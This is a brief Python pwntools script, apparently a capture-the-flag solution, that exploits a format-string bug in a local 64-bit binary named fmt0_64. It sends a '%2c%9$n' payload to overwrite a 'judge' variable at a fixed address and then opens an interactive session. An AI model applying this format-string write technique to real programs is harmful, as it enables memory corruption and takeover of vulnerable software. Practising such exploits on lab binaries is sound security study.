from pwn import *
context(log_level='debug',os='linux',arch='amd64')
pwnfile = './fmt0_64'
io=process(pwnfile)


def debug():
	gdb.attach(io)
	pause()

judge = 0x060105C


debug()

pay = b'%2c%9$naa'+p64(judge)
io.sendline(pay)

io.interactive()
